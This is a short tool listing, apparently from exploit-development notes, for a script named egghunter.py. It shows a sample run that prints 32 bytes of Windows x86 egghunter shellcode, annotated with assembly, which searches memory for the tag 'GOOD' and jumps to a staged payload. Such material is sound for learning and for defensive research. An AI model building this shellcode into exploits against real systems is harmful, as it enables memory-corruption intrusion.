# Tools

- egghunter.py

```shell
$ egghunter.py --egg GOOD
[+] Egghunter length: 32 bytes
egghunter = (
	"\x66\x81\xca\xff\x0f"          # or	dx, 0xfff
	"\x42"                          # inc	edx
	"\x52"                          # push	edx
	"\x6a\x02"                      # push	2
	"\x58"                          # pop	eax
	"\xcd\x2e"                      # int	0x2e
	"\x3c\x05"                      # cmp	al, 5
	"\x5a"                          # pop	edx
	"\x74\xef"                      # je	0x1000
	"\xb8\x44\x4f\x4f\x47"          # mov	eax, 0x474f4f44
	"\x8b\xfa"                      # mov	edi, edx
	"\xaf"                          # scasd	eax, dword ptr es:[edi]
	"\x75\xea"                      # jne	0x1005
	"\xaf"                          # scasd	eax, dword ptr es:[edi]
	"\x75\xe7"                      # jne	0x1005
	"\xff\xe7"                      # jmp	edi
)

```
